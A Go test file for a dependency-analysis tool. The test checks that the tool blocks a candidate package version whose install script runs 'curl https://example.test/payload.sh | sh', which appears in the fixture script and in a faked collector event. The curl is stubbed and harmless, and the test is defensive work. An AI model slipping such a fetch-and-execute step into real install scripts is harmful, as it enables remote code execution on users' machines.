package limier

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/oneslash/limier/internal/adapter"
	"github.com/oneslash/limier/internal/analysis"
	"github.com/oneslash/limier/internal/collector"
	"github.com/oneslash/limier/internal/env/docker"
	"github.com/oneslash/limier/internal/report"
	"github.com/oneslash/limier/internal/rules"
	"github.com/oneslash/limier/internal/scenario"
	"github.com/oneslash/limier/internal/verdict"
)

func TestDynamicFakeExploitScenarioBlocksCandidate(t *testing.T) {
	fixturePath := writeDynamicFixture(t)
	evidenceRoot := filepath.Join(t.TempDir(), "evidence")
	repoRoot := filepath.Clean(filepath.Join("..", ".."))

	ruleSet, err := rules.Load(filepath.Join(repoRoot, "rules", "default.yml"))
	if err != nil {
		t.Fatalf("rules.Load() error = %v", err)
	}

	manifest := scenario.Manifest{
		Version: 1,
		Name:    "dynamic fake exploit smoke test",
		Repeats: 2,
		Workdir: "/workspace",
		Success: scenario.Success{ExitCode: 0},
		Steps: []scenario.Step{
			{Name: "install dependency", Run: "install"},
			{Name: "exercise package", Run: "exercise", Command: "cat installed-version.txt"},
		},
	}

	testAdapter := dynamicFixtureAdapter{}
	testCollector := fakeExploitCollectorFactory{}
	testManager := localRunManager{}

	baseline, _, baselineDiagnostic := runSide(context.Background(), sideRequest{
		Name:             "baseline",
		Version:          "1.0.0",
		FixturePath:      fixturePath,
		PackageName:      "fake-package",
		Scenario:         manifest,
		Image:            "alpine:3.20",
		EvidenceRoot:     evidenceRoot,
		Adapter:          testAdapter,
		CollectorFactory: testCollector,
		Manager:          testManager,
	})
	if baselineDiagnostic != nil {
		t.Fatalf("baseline diagnostic = %#v, want nil", baselineDiagnostic)
	}
	if !baseline.Stable {
		t.Fatalf("baseline.Stable = false, want true; runs = %#v", baseline.Runs)
	}
	if got := baseline.InstalledVersion; got != "1.0.0" {
		t.Fatalf("baseline installed version = %q, want %q", got, "1.0.0")
	}

	candidate, _, candidateDiagnostic := runSide(context.Background(), sideRequest{
		Name:             "candidate",
		Version:          "1.1.0",
		FixturePath:      fixturePath,
		PackageName:      "fake-package",
		Scenario:         manifest,
		Image:            "alpine:3.20",
		EvidenceRoot:     evidenceRoot,
		Adapter:          testAdapter,
		CollectorFactory: testCollector,
		Manager:          testManager,
	})
	if candidateDiagnostic != nil {
		t.Fatalf("candidate diagnostic = %#v, want nil", candidateDiagnostic)
	}
	if !candidate.Stable {
		t.Fatalf("candidate.Stable = false, want true; runs = %#v", candidate.Runs)
	}
	if got := candidate.InstalledVersion; got != "1.1.0" {
		t.Fatalf("candidate installed version = %q, want %q", got, "1.1.0")
	}
	if got := candidate.Summary.EventCounts["process.exec"]; got != 1 {
		t.Fatalf("candidate process.exec count = %d, want 1", got)
	}

	result := analysis.Evaluate(baseline, candidate, manifest.Success.ExitCode, ruleSet)
	if result.TechnicalVerdict != verdict.TechnicalSuspiciousDiff {
		t.Fatalf("technical verdict = %q, want %q", result.TechnicalVerdict, verdict.TechnicalSuspiciousDiff)
	}
	if result.OperatorRecommendation != verdict.RecommendationBlock {
		t.Fatalf("operator recommendation = %q, want %q", result.OperatorRecommendation, verdict.RecommendationBlock)
	}

	finding := requireFindingByKind(t, result.Findings, "new_process_exec")
	if finding.Step != "install dependency" {
		t.Fatalf("finding.Step = %q, want %q", finding.Step, "install dependency")
	}
	if finding.Phase != "install" {
		t.Fatalf("finding.Phase = %q, want %q", finding.Phase, "install")
	}
	if !strings.Contains(finding.Message, "curl https://example.test/payload.sh | sh") {
		t.Fatalf("finding.Message = %q, want fake exploit command", finding.Message)
	}

	requireRuleHit(t, result.RuleHits, "hard-block-new-curl-fetch", "hard_block")
	requireRuleHit(t, result.RuleHits, "hard-block-shell-pipe", "hard_block")
}

type dynamicFixtureAdapter struct{}

func (dynamicFixtureAdapter) Ecosystem() string {
	return "fake"
}

func (dynamicFixtureAdapter) DefaultImage() string {
	return "alpine:3.20"
}

func (dynamicFixtureAdapter) PrepareWorkspace(context.Context, string, adapter.DependencySpec) (adapter.PreparedWorkspace, error) {
	return adapter.PreparedWorkspace{
		InstallCommand: `PATH="$PWD/bin:$PATH" sh ./scripts/install.sh`,
	}, nil
}

func (dynamicFixtureAdapter) ResolveStep(step scenario.Step, prepared adapter.PreparedWorkspace) (adapter.StepPlan, error) {
	command := step.Command
	if step.Run == "install" {
		command = prepared.InstallCommand
	}

	return adapter.StepPlan{
		Name:    step.Name,
		Intent:  step.Run,
		Command: command,
	}, nil
}

func (dynamicFixtureAdapter) ReadInstalledVersion(workspace string, _ adapter.DependencySpec, _ adapter.PreparedWorkspace) (string, error) {
	data, err := os.ReadFile(filepath.Join(workspace, "installed-version.txt"))
	if err != nil {
		return "", err
	}

	return strings.TrimSpace(string(data)), nil
}

type fakeExploitCollectorFactory struct{}

func (fakeExploitCollectorFactory) Start(run collector.RunContext) (collector.RunCollector, error) {
	return fakeExploitRunCollector{side: run.Side}, nil
}

type fakeExploitRunCollector struct {
	side string
}

func (c fakeExploitRunCollector) StartStepCapture(_ context.Context, step collector.StepContext) (collector.StepCapture, error) {
	return fakeExploitStepCapture{
		side:     c.side,
		stepName: step.Name,
	}, nil
}

type fakeExploitStepCapture struct {
	side     string
	stepName string
}

func (c fakeExploitStepCapture) Finish(context.Context) ([]collector.Event, error) {
	if c.side != "candidate" || c.stepName != "install dependency" {
		return nil, nil
	}

	return []collector.Event{
		{
			Kind:      "process.exec",
			Step:      "install dependency",
			Command:   "curl https://example.test/payload.sh | sh",
			Timestamp: time.Unix(0, 1).UTC(),
		},
	}, nil
}

type localRunManager struct{}

func (localRunManager) Run(ctx context.Context, request docker.RunRequest) (docker.RunResult, error) {
	result := docker.RunResult{
		RunIndex: request.RunIndex,
	}

	if err := os.MkdirAll(request.EvidenceDir, 0o755); err != nil {
		return result, err
	}

	runStart := time.Now()
	env := mergeEnv(request.Env)

	for index, step := range request.Steps {
		stepResult, stepEvents, err := runLocalStep(ctx, request, env, index, step)
		result.Steps = append(result.Steps, stepResult)
		result.EvidenceFiles = append(result.EvidenceFiles, stepResult.Evidence.Stdout.Path, stepResult.Evidence.Stderr.Path)
		result.Events = append(result.Events, stepEvents...)
		result.ExitCode = stepResult.ExitCode
		if err != nil {
			return result, err
		}
		if stepResult.ExitCode != 0 {
			break
		}
	}

	result.DurationMilliseconds = time.Since(runStart).Milliseconds()

	if len(result.Events) > 0 {
		eventsPath := filepath.Join(request.EvidenceDir, "events.json")
		data, err := json.MarshalIndent(result.Events, "", "  ")
		if err != nil {
			return result, err
		}
		data = append(data, '\n')
		if err := os.WriteFile(eventsPath, data, 0o644); err != nil {
			return result, err
		}
		result.EventsPath = eventsPath
		result.EvidenceFiles = append(result.EvidenceFiles, eventsPath)
	}

	return result, nil
}

func runLocalStep(ctx context.Context, request docker.RunRequest, env []string, index int, step docker.Step) (docker.StepResult, []collector.Event, error) {
	stdoutPath := filepath.Join(request.EvidenceDir, localStepFilename(index, step.Name, "stdout"))
	stderrPath := filepath.Join(request.EvidenceDir, localStepFilename(index, step.Name, "stderr"))
	stdoutFile, err := os.Create(stdoutPath)
	if err != nil {
		return docker.StepResult{}, nil, err
	}
	defer stdoutFile.Close()

	stderrFile, err := os.Create(stderrPath)
	if err != nil {
		return docker.StepResult{}, nil, err
	}
	defer stderrFile.Close()

	var stdoutBuffer strings.Builder
	var stderrBuffer strings.Builder

	cmd := exec.CommandContext(ctx, "sh", "-lc", step.Command)
	cmd.Dir = request.Workspace
	cmd.Env = env
	cmd.Stdout = multiWriter(stdoutFile, &stdoutBuffer)
	cmd.Stderr = multiWriter(stderrFile, &stderrBuffer)

	var stepCapture collector.StepCapture
	if request.Collector != nil {
		stepCapture, err = request.Collector.StartStepCapture(ctx, collector.StepContext{
			Name:                step.Name,
			Intent:              step.Intent,
			Command:             step.Command,
			ContainerCgroupPath: "/fake-cgroup",
		})
		if err != nil {
			return docker.StepResult{}, nil, err
		}
	}

	start := time.Now()
	err = cmd.Run()
	duration := time.Since(start).Milliseconds()
	exitCode, runErr := commandExit(err)
	if runErr != nil {
		return docker.StepResult{}, nil, runErr
	}

	var events []collector.Event
	if stepCapture != nil {
		events, err = stepCapture.Finish(context.Background())
		if err != nil {
			return docker.StepResult{}, nil, err
		}
	}

	stdout := stdoutBuffer.String()
	stderr := stderrBuffer.String()

	return docker.StepResult{
		Name:                 step.Name,
		Intent:               step.Intent,
		Command:              step.Command,
		ExitCode:             exitCode,
		DurationMilliseconds: duration,
		Stdout:               outputFromText(stdout),
		Stderr:               outputFromText(stderr),
		Evidence: docker.StepEvidence{
			Stdout: docker.OutputFile{
				Path:        stdoutPath,
				StoredBytes: int64(len(stdout)),
			},
			Stderr: docker.OutputFile{
				Path:        stderrPath,
				StoredBytes: int64(len(stderr)),
			},
		},
	}, events, nil
}

func mergeEnv(overrides map[string]string) []string {
	base := map[string]string{}
	for _, entry := range os.Environ() {
		key, value, ok := strings.Cut(entry, "=")
		if !ok {
			continue
		}
		base[key] = value
	}

	for key, value := range overrides {
		base[key] = value
	}

	merged := make([]string, 0, len(base))
	for key, value := range base {
		merged = append(merged, key+"="+value)
	}

	return merged
}

func multiWriter(file *os.File, builder *strings.Builder) *writerSet {
	return &writerSet{file: file, builder: builder}
}

type writerSet struct {
	file    *os.File
	builder *strings.Builder
}

func (w *writerSet) Write(data []byte) (int, error) {
	if _, err := w.file.Write(data); err != nil {
		return 0, err
	}
	if _, err := w.builder.Write(data); err != nil {
		return 0, err
	}
	return len(data), nil
}

func commandExit(err error) (int, error) {
	if err == nil {
		return 0, nil
	}

	var exitErr *exec.ExitError
	if errors.As(err, &exitErr) {
		return exitErr.ExitCode(), nil
	}

	return 0, err
}

func outputFromText(text string) docker.Output {
	digest := sha256.Sum256([]byte(text))
	return docker.Output{
		Preview:    text,
		TotalBytes: int64(len(text)),
		SHA256:     hex.EncodeToString(digest[:]),
	}
}

func localStepFilename(index int, name string, suffix string) string {
	safe := strings.ToLower(name)
	replacer := strings.NewReplacer(" ", "-", "/", "-", "\\", "-", ".", "-")
	safe = replacer.Replace(safe)
	return fmt.Sprintf("%02d.%s.%s", index+1, safe, suffix)
}

func writeDynamicFixture(t *testing.T) string {
	t.Helper()

	root := t.TempDir()
	writeExecutable(t, filepath.Join(root, "bin", "curl"), strings.TrimSpace(`
#!/bin/sh
cat "$(dirname "$0")/../scripts/fake-payload.sh"
`)+"\n")
	writeExecutable(t, filepath.Join(root, "scripts", "fake-payload.sh"), strings.TrimSpace(`
#!/bin/sh
printf 'fake exploit payload executed for %s\n' "$LIMIER_VERSION_UNDER_TEST"
`)+"\n")
	writeExecutable(t, filepath.Join(root, "scripts", "install.sh"), strings.TrimSpace(`
#!/bin/sh
set -eu
printf '%s\n' "$LIMIER_VERSION_UNDER_TEST" > installed-version.txt
printf 'installing %s\n' "$LIMIER_VERSION_UNDER_TEST"
if [ "$LIMIER_VERSION_UNDER_TEST" = "1.1.0" ]; then
  curl https://example.test/payload.sh | sh
fi
`)+"\n")

	return root
}

func writeExecutable(t *testing.T, path string, contents string) {
	t.Helper()

	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatalf("MkdirAll(%q) error = %v", path, err)
	}
	if err := os.WriteFile(path, []byte(contents), 0o755); err != nil {
		t.Fatalf("WriteFile(%q) error = %v", path, err)
	}
}

func requireFindingByKind(t *testing.T, findings []report.Finding, kind string) report.Finding {
	t.Helper()

	for _, finding := range findings {
		if finding.Kind == kind {
			return finding
		}
	}

	t.Fatalf("findings = %#v, want kind %q", findings, kind)
	return report.Finding{}
}

func requireRuleHit(t *testing.T, hits []report.RuleHit, ruleID string, category string) {
	t.Helper()

	for _, hit := range hits {
		if hit.RuleID == ruleID && hit.Category == category {
			return
		}
	}

	t.Fatalf("rule hits = %#v, want rule %q in category %q", hits, ruleID, category)
}
